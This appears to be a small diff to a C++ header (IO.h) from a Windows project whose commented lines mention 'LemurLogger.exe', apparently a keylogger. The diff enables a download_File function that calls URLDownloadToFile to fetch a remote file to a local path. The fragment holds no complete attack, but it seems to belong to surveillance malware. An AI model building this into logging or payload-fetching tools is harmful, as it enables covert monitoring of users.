@@ -1,6 +1,7 @@
 #ifndef IO_H
 #define IO_H
 
+
 #include <string>
 #include <cstdlib>
 #include <fstream>
@@ -9,7 +10,8 @@
 #include <windows.h>
 #include "Helper.h"
 #include "Base64.h"
-//#include <Urlmon.h>
+#include <Urlmon.h>
+//#include <curl/curl.h>
 #include <tchar.h>
 #include <vector>
 #include <wininet.h>
@@ -138,15 +140,14 @@ namespace IO
 
     }
 
-    bool download_File(TCHAR urlfile,TCHAR despath)
+    bool download_File(const char * urlfile,const char * despath)
     {
 
-        TCHAR url = urlfile;
-        TCHAR path = despath;
+
         //GetCurrentDirectory(MAX_PATH, path);
         //wsprintf(path, TEXT("%s\\LemurLogger.exe"), path);
         //printf("Path: %S\n", path);
-        HRESULT res ;//= URLDownloadToFile(NULL, url, path, 0, NULL);
+        HRESULT res = URLDownloadToFile(NULL, urlfile, despath, 0, NULL);
         if(res == S_OK) {
             return true;
         } else if(res == E_OUTOFMEMORY) {
